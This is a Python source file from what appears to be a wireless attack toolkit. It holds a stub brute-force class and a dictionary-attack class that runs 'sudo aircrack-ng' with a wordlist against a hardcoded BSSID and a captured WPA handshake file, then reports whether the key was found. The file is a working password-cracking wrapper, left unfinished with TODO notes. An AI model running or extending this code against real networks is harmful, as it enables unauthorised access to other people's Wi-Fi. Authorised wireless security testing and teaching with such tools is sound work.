
from Model.Attacks.AbstractAttack import AbstractAttack
from Model.utils import target_dump
import subprocess as sb

class BruteForceAttack(AbstractAttack):

    @classmethod
    def attack_name(cls) -> str:
        return 'Brute Force'

    @classmethod
    def execute_attack(cls):
        pass

class DictionaryAttack(AbstractAttack):
    __path_dict = 'Model/files/wordlist.txt' #TODO make default wordlist

    @classmethod
    def attack_name(cls) -> str:
        return 'Dictionary attack'
    
    @classmethod
    def execute_attack(cls, target=None):
        
        '''
        Attempts to crack the captured hash containing the password with a dictionary attack using the Aircrack tool 
        '''
        target.bssid = 'E8:DE:27:B0:14:C9' #TODO
        target_dump = 'Model/files/handshake' #TODO
        cmd = ['sudo',
            'aircrack-ng',
            '-w', cls.__path_dict, #TODO create/upload dictionary file
            '-b', target.bssid,
            target_dump + "-01.cap"]
        
        result = sb.Popen(cmd, stdout=sb.PIPE, universal_newlines=True)
        output = result.stdout.read()

        if output.find('No valid WPA handshakes found') != -1:
            yield 'No valid WPA handshakes found'
        elif output.find('KEY FOUND') != -1:
            yield 'KEY FOUND'
        elif output.find('KEY NOT FOUND') != -1:
            yield 'KEY NOT FOUND'

        result.stdout.close()
        return_code = result.wait()

        if return_code:
            raise sb.CalledProcessError(return_code, cmd)